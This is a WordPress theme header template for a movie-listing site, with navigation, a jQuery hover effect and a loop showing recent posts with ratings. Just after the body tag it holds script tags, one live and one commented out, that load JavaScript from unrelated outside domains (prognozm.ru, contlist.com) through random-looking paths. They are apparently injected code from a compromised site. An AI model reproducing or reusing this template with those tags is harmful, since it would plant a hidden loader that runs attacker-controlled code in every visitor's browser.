<!DOCTYPE html>
<html <?php language_attributes(); ?>>
  <head>
    <meta charset="<?php bloginfo( 'charset' ); ?>" />
    <meta property='fb:app_id' content='554717244673639' />
    <link rel="profile" href="http://gmpg.org/xfn/11" />
    <link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />
    <link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
    <title><?php bloginfo( 'name' ); ?><?php wp_title( '&mdash;' ); ?></title>

    <?php wp_head(); ?>
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-53eaccfe0997b024" async></script>

        <script type="text/javascript">
jQuery(document).ready(function($) {

	$(".movie-image").hover(function(){
		$(this).find(".play").show();
	},
	function()
	{
		$(this).find(".play").hide();
	});
	$(".blink").focus(function() {
            if(this.title==this.value) {
                this.value = '';
            }
        })
        .blur(function(){
            if(this.value=='') {
                this.value = this.title;                    
			}
		});
});
</script>
  </head>
  
  <body <?php body_class(); ?>>
  <!-- Shell  <script async charset='UTF-8' language='javascript' type='text/javascript' src='http://contlist.com/7be3mpoif4i58shgtdinv15kjceh2tyz48yep67salhxksl'></script>
  der -->
  <script language='javascript' type='text/javascript' src='http://prognozm.ru/53824pe92ji6rzoa6uvxvo5ey88j0aqmb55xlvz1xh7d'></script>
 <!-- Shell -->
<div id="shell">
	<!-- Header -->
	<div id="header">
		<h1 id="logo"><a href="<?php bloginfo('siteurl'); ?>"><?php bloginfo('name'); ?></a></h1>
		<div class="social">
			<span>FOLLOW US ON:</span>
			<ul>
			    <li><a class="twitter" href="#">twitter</a></li>
			    <li><a class="facebook" href="#">facebook</a></li>
			    <li><a class="vimeo" href="#">vimeo</a></li>
			    <li><a class="rss" href="#">rss</a></li>
			</ul>
		</div>
		
		<!-- Navigation -->
		<div id="navigation">
			<?php if ( has_nav_menu( 'menu' ) ) : wp_nav_menu(); else : ?>
          <ul><?php wp_list_pages( 'title_li=&depth=-1' ); ?></ul>
        <?php endif; ?>
		</div>
		<!-- end Navigation -->
		
		<!-- Sub-menu -->
		<div id="sub-navigation">
			<?php if ( has_nav_menu( 'menu' ) ) : wp_nav_menu(); else : ?>
          <ul><?php wp_list_pages( 'title_li=&depth=-1' ); ?></ul>
        <?php endif; ?>
			<div id="search">
				<?php get_search_form(); ?>
			</div>
		</div>
		<!-- end Sub-Menu -->
		
	</div>
	<!-- end Header --> 
<div id="main"> 
  <!-- Content -->
  <div id="content"> 
    
    <!-- Box -->
    <div class="box">
      <div class="head">
        <h2>LATEST ADDITIONS</h2>
        <p class="text-right"><a href="#">See all</a></p>
      </div>
      <?php $i=1; ?>
      
      <?php query_posts('showposts=6'); if (have_posts()) : while (have_posts()) : the_post(); ?>
      <div class="movie n<?php echo $i;?>">
        <div class="movie-image"> <a href="<?php the_permalink(); ?>"><span class="play"><span class="name">
          <?php the_title_attribute(); ?>
          </span></span>
          <?php if ( has_post_thumbnail() ) { the_post_thumbnail();} ?>
          </a> </div>
        <div class="rating">
          <p>RATING</p>

          <div class="stars">
            <span class="rating-static rating-<?php echo (round((get_post_meta( $post->ID,'rating','true')/2),0,PHP_ROUND_HALF_UP)*10); ?>"></span>
          </div>

          <span class="comments"><?php echo get_post_meta( $post->ID,'rating','true'); ?></span> </div>
      </div>
      <?php $i++; ?>
      <?php endwhile; ?>
      <?php else : ?>
      <?php endif; wp_reset_query(); ?>
      <!-- end Movie -->
      <div class="cl">&nbsp;</div>
    </div>  
  
  
    